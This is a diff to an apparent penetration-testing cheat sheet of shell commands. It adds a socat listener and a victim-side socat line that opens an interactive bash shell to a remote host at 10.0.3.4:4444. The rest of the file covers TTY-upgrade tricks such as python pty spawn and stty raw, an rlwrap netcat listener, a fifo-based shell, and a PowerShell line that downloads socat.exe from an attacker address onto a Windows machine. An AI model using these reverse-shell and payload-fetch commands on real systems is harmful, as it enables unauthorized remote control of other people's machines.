@@ -4,23 +4,29 @@ updog -d /tmp -p 1234
 php -S localhost:9000 -t PATH
 
 # python
-python -c 'import pty;pty.spawn("/bin/bash")'
-export TERM=xterm
-background the shell using Ctrl + Z && stty raw -echo; fg
-stty -a
-stty row "x" cols "x"
+V> python -c 'import pty;pty.spawn("/bin/bash")'
+V> Ctrl + Z 
+A> stty raw -echo; fg
+
+V> reset
+V> export SHELL=bash
+V> export TERM=xterm-256color
+V> stty rows <num> columns <cols>
 
 # rlwrap
 rlwrap nc -lvnp <port>
-background the shell using Ctrl + Z && stty raw -echo; fg
-stty -a
-stty row "x" cols "x"
 
 # TTY
 script /dev/null -c bash
 mkfifo input; tail -f input | /bin/bash > output
 
 # socat
+#Listener:
+socat file:`tty`,raw,echo=0 tcp-listen:4444
+
+#Victim:
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
+
 # Reverse Shells 
 Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe
 
